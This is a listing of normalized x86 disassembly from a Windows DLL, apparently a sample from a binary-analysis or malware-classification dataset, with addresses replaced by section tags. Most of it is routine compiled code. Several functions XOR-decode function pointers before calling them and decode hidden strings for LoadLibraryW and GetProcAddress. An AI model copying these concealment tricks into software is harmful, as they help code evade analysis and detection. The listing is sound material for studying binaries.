imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10050c60
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x218 ]
push 0x1
push ecx
mov ecx [ ebp - 0x21c ]
push edx
lea edx [ ebp - 0x20c ]
call sub_10047320
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1003ecd0
push ebp
mov ebp esp
push 0xffffffff
push sub_100871be
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi edx
lea edi [ eax + 0x8 ]
mov [ eax ] 0x0
xor edx edx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] edx
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] esi
mov [ edi ] dl
mov [ ebp - 0x4 ] edx
mov [ eax + 0x24 ] esi
mov esi [ ebp + 0xc ]
lea ebx [ eax + 0x34 ]
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] esi
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] 0x1
lea esi [ eax + 0x4 ]
cmp ecx edx
je r-xdata
push esi
call sub_10026420
add esp 0x4
mov [ esi ] ecx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x38 ]
call sub_10029d90
mov edx [ ebp - 0x3c ]
mov [ edx + 0x30 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
cmp [ edx + 0x2c ] eax
ja r-xdata
mov eax [ ebp - 0x30 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx esi
push 0x4
lea esi [ ebp - 0x30 ]
call sub_100662b0
add esp 0x4
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_1003acf0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x1c ] 0x10
jb r-xdata
mov ecx [ edx + 0x24 ]
mov esi [ edx + 0x2c ]
mov edi [ ebp + 0x10 ]
mov edx esi
sub edx eax
add ecx eax
cmp edx edi
jbe r-xdata
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x14
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x2c ] edx
test edi edi
je r-xdata
mov edx edi
xor edi edi
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x28 ] eax
call sub_10029d90
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x4 ]
lea edx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] esi
cmp edx eax
jmp r-xdata
add eax [ ebp + 0x18 ]
xor esi esi
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x30 ] esi
mov [ ebp - 0x28 ] eax
call sub_10029d90
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x4 ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] edi
cmp ecx eax
jae r-xdata
mov ecx [ ebx + 0x8 ]
cmp eax ecx
jne r-xdata
mov edx [ ebx ]
lea ecx [ ebp - 0x34 ]
cmp edx ecx
ja r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov edx [ ebx ]
sub eax edx
sar eax 0x5
cmp eax 0x7fffffe
ja r-xdata
mov esi ecx
mov ecx [ ebx + 0x8 ]
sub esi edx
cmp eax ecx
jne r-xdata
mov eax [ ebp - 0x38 ]
add eax [ ebp + 0x10 ]
mov edx [ ebp - 0x3c ]
add [ ebx + 0x4 ] 0x20
mov [ ebp - 0x38 ] eax
cmp eax [ edx + 0x2c ]
jb r-xdata
lea esi [ ebp - 0x34 ]
push r--data
call sub_10030594
sub ecx edx
inc eax
sar ecx 0x5
cmp eax ecx
jbe r-xdata
mov edi [ ebx + 0x4 ]
and esi 0xffffffe0
add esi [ ebx ]
test edi edi
je r-xdata
sub eax edx
sar eax 0x5
cmp eax 0x7fffffe
ja r-xdata
mov eax [ ebp - 0x38 ]
jmp r-xdata
mov edx ecx
shr edx 0x1
mov esi 0x7ffffff
sub esi edx
cmp esi ecx
jae r-xdata
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x5
cmp eax ecx
jbe r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov ecx 0x8
[ edi ] [ esi ]
mov edx ecx
shr edx 0x1
mov edi 0x7ffffff
sub edi edx
cmp edi ecx
jae r-xdata
mov edx ebx
call sub_100683a0
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ebx
call sub_100683a0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_1003ef10
cmp ecx edx
je r-xdata
retn
push esi
add ecx 0x8
add eax 0x8
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
test eax eax
je r-xdata
pop esi
sub_1003ef40
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10087900
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
movzx eax [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov [ esp + 0x20 ] edi
mov [ esp + 0x10 ] eax
jne r-xdata
lea eax [ esp + 0x24 ]
push eax
mov ecx esi
call sub_10007a10
push eax
mov [ esp + 0x7c ] 0x0
call sub_10064f10
mov [ esp + 0x7c ] 0xffffffff
mov edi [ esp + 0x28 ]
add esp 0x4
mov [ esp + 0x18 ] eax
test edi edi
je r-xdata
movzx ecx [ ebp + 0x1c ]
mov edx [ ebx ]
mov edx [ edx + 0x1c ]
push ecx
mov ecx [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push esi
push eax
push ecx
push edi
mov ecx ebx
call edx
mov eax edi
jmp r-xdata
xor ecx ecx
mov [ esp + 0x44 ] 0x7
mov [ esp + 0x40 ] 0x0
mov [ esp + 0x30 ] cx
mov [ esp + 0x78 ] 0x1
cmp [ ebp + 0x1c ] cl
je r-xdata
push 0x0
lea ecx [ esp + 0x2c ]
mov [ esp + 0x18 ] edi
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x18
lea ecx [ esp + 0x4c ]
push ecx
mov ecx [ esp + 0x1c ]
call sub_10027430
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x7c ] 0x3
call sub_10033f90
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] 0x8
jb r-xdata
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x4c ]
push edx
call sub_1005aac0
push eax
lea ecx [ esp + 0x34 ]
mov [ esp + 0x7c ] 0x2
call sub_10033f90
mov [ esp + 0x78 ] 0x1
cmp [ esp + 0x60 ] 0x8
jb r-xdata
mov edi [ edi + 0x4 ]
neg edi
sbb edi edi
lea ecx [ esp + 0x28 ]
not edi
call sub_10003c9c
and edi [ esp + 0x14 ]
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ esi + 0x24 ] 0x0
mov edi [ esi + 0x20 ]
mov ecx [ esp + 0x40 ]
jl r-xdata
mov edx [ esp + 0x4c ]
push edx
mov eax [ esp + 0x4c ]
push eax
jmp r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ edi + 0x4 ] eax
xor edi edi
jg r-xdata
call sub_1000a86e
add esp 0x4
cmp [ esp + 0x44 ] 0x8
mov eax [ esp + 0x30 ]
jae r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
push edx
push eax
lea ecx [ esp + 0x38 ]
push ecx
push ebx
call sub_10024610
mov edx [ eax ]
mov ecx [ esp + 0x58 ]
mov [ ebp + 0xc ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp edi ecx
jbe r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x10 ]
push eax
push ecx
push edx
lea eax [ esp + 0x28 ]
push eax
push ebx
call sub_10023460
mov ecx [ eax ]
xor edx edx
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push edi
mov [ esi + 0x20 ] edx
mov [ esi + 0x24 ] edx
mov edx [ esp + 0x2c ]
mov esi [ esp + 0x3c ]
push edx
push eax
push ecx
push esi
push ebx
mov [ ebp + 0x10 ] eax
call sub_10024610
add esp 0x30
cmp [ esp + 0x44 ] 0x8
jb r-xdata
lea eax [ esp + 0x30 ]
sub edi ecx
jmp r-xdata
mov eax esi
mov eax [ esp + 0x30 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_1003f190
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_1002fcd0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1003f1b2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_1001b2d2
pop ecx
push esi
call sub_1001b2d2
pop ecx
sub_1003f2d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086888
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov esi eax
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
test esi esi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx eax
call sub_1000b3f0
jmp r-xdata
push 0x40
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
je r-xdata
sub_1003f3ab
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004579a
add esp 0x18
pop ebp
retn
sub_1003f3d0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088ae8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov edi ecx
call sub_1003c1d0
lea edi [ esi + 0x70 ]
xor eax eax
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] eax
mov [ edi ] cx
mov [ ebp - 0x4 ] eax
mov ecx esi
mov [ esi ] r--data
call sub_10005560
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov edx [ rw-data ]
push 0x0
push 0x80
push 0x4
push 0x0
push 0x0
mov [ ebp - 0x10 ] edx
xor [ ebp - 0x10 ] 0x38
xor [ ebp - 0xf ] 0x38
xor [ ebp - 0xe ] 0x38
xor [ ebp - 0xd ] 0x38
push 0x60000000
push edi
call [ ebp - 0x10 ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov edi [ edi ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
push 0x0
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
mov edx [ ebp + 0xc ]
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
mov [ ebp - 0x10 ] eax
xor [ ebp - 0x10 ] 0x38
xor [ ebp - 0xf ] 0x38
xor [ ebp - 0xe ] 0x38
xor [ ebp - 0xd ] 0x38
push edx
push edi
call [ ebp - 0x10 ]
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
xor [ ebp + 0xc ] 0x38
xor [ ebp + 0xd ] 0x38
xor [ ebp + 0xe ] 0x38
xor [ ebp + 0xf ] 0x38
push edi
call [ ebp + 0xc ]
xor ecx ecx
cmp [ ebp - 0x14 ] ebx
sete cl
mov [ esi + 0x8 ] ecx
sub_1003f4d3
push 0xc
push r--data
call sub_1007fad0
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
jmp r-xdata
push esi
call sub_100205e6
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10017636
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003f53f
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_1007fb15
retn
mov eax [ ebp - 0x1c ]
sub_1003f550
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x5c
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1002d970
mov eax esi
mov esp ebp
pop ebp
retn
sub_1003f5a0
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x34 ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x38 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0x38 ]
push ebx
mov ebx [ ebp - 0x34 ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10048ec0
xor ebx ebx
mov [ esi ] r--data
mov [ esi + 0x2c0 ] ebx
xor ecx ecx
mov [ esi + 0x2d8 ] 0x7
mov [ esi + 0x2d4 ] ebx
mov [ esi + 0x2c4 ] cx
mov [ esi + 0x2e4 ] bl
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffd6
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov [ ebp - 0x1c ] ax
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x34 ] eax
mov [ esi + 0x2c0 ] eax
cmp eax ebx
je r-xdata
mov eax esi
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov al [ ecx + edi ]
xor al dl
xor al 0x99
inc dl
mov [ ebp + ecx - 0x18 ] al
movzx ecx dl
cmp ecx 0x12
jb r-xdata
mov edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x18 ]
push ecx
push edx
mov [ ebp - 0x6 ] bl
call [ GetProcAddress@IAT ]
mov [ esi + 0x2e0 ] eax
cmp eax ebx
mov eax esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
pop edi
mov [ esi + 0x2e4 ] 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
sub_1003f6e5
push 0x8
mov eax sub_10085eb2
call sub_10026266
xor ebx ebx
push ebx
push ebx
mov [ ebp - 0x10 ] ebx
call sub_10047a9f
mov edi [ ebp + 0x14 ]
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_1002bedb
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_10006dcd
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x8
call sub_1002e3ac
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10021806
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_1002d6c6
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push edi
mov esi eax
call sub_100341f0
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_10047742
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
call sub_10008d33
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_10007c6c
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x1c
call sub_1002e3ac
pop ecx
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x12
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_1002227e
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_1006b0f2
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x14
call sub_1002e3ac
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
mov ecx eax
call sub_10034577
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push [ ebp + 0x14 ]
mov esi eax
call sub_1005b959
push esi
push eax
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0x10
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0xd
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_10066b6a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0xe
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_1002227e
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_1006ef60
push eax
push esi
push [ ebp + 0x10 ]
call sub_1006a134
add esp 0xc
jmp r-xdata
sub_1003faa0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx + 0x4 ]
jne r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ecx ]
push eax
mov eax [ edx ]
push eax
push ecx
call sub_10011b4a
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x1
pop ebp
retn
sub_1003fad0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10086cf8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x78 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x90 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x24 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0x30 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ esp + 0x48 ] eax
mov eax [ ebp + 0x28 ]
mov [ esp + 0x3c ] eax
mov [ esp + 0x24 ] edx
mov edx [ ebp + 0x2c ]
lea eax [ esp + 0x4c ]
push eax
mov [ esp + 0x44 ] ecx
mov [ esp + 0x1c ] edx
mov [ esp + 0x14 ] ebx
call sub_10007a10
push eax
mov [ esp + 0x9c ] 0x0
call sub_10064f10
mov [ esp + 0x48 ] eax
mov [ esp + 0x9c ] 0xffffffff
mov eax [ esp + 0x50 ]
add esp 0x4
test eax eax
je r-xdata
lea ecx [ esp + 0x6c ]
push ecx
mov ecx [ esp + 0x48 ]
call sub_10069c00
mov ecx [ esp + 0x44 ]
mov [ esp + 0x98 ] 0x1
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
movzx ecx ax
xor eax eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] eax
mov [ esp + 0x50 ] al
mov [ esp + 0x98 ] 0x2
lea edx [ edi + 0x8 ]
push edx
mov [ esp + 0x3c ] eax
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x20 ]
push eax
push 0x1
lea ecx [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x48 ]
push edx
mov [ esp + 0x3c ] 0x30
call sub_10025a12
mov al [ esi ]
add esp 0x14
cmp al 0x2b
je r-xdata
push 0x0
lea ecx [ esp + 0x20 ]
mov [ esp + 0x24 ] eax
call sub_1000c927
mov ecx [ esp + 0x20 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov [ esp + 0x1c ] 0x1
mov [ esp + 0x1c ] 0x0
cmp al 0x2d
jne r-xdata
mov eax [ ecx + 0x4 ]
neg eax
sbb eax eax
not eax
and eax ecx
lea ecx [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
call sub_10003c9c
mov ecx [ esp + 0x20 ]
test ecx ecx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esp + 0x80 ]
mov eax [ esp + 0x6c ]
mov ecx eax
cmp edx 0x10
jae r-xdata
mov [ esp + 0x18 ] eax
call sub_1003d7d5
mov eax [ eax ]
mov cl [ eax ]
push ebx
push 0x65
push esi
mov [ esp + 0x38 ] cl
mov [ esp + 0x39 ] 0x65
call sub_1007f310
movsx edx [ esp + 0x38 ]
add esp 0xc
push ebx
push edx
push esi
mov [ esp + 0x3c ] eax
call sub_1007f310
add esp 0xc
mov [ esp + 0x14 ] eax
test eax eax
jne r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
dec eax
mov [ ecx + 0x4 ] eax
cmp [ ecx ] 0x7f
je r-xdata
lea ecx [ esp + 0x6c ]
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x40 ]
lea eax [ ebx + ecx ]
add eax [ esp + 0x3c ]
mov ecx [ edx + 0x20 ]
add eax [ esp + 0x24 ]
cmp [ edx + 0x24 ] 0x0
jl r-xdata
cmp edx 0x10
jae r-xdata
mov [ esp + 0x14 ] 0x0
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x6c ]
movsx ecx [ esp + 0x2c ]
push ebx
push ecx
push esi
call sub_1007f310
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
je r-xdata
cmp ecx eax
jbe r-xdata
test ecx ecx
je r-xdata
push ebx
push esi
lea ecx [ esp + 0x58 ]
call sub_10012830
mov ebx [ esp + 0x30 ]
test ebx ebx
jne r-xdata
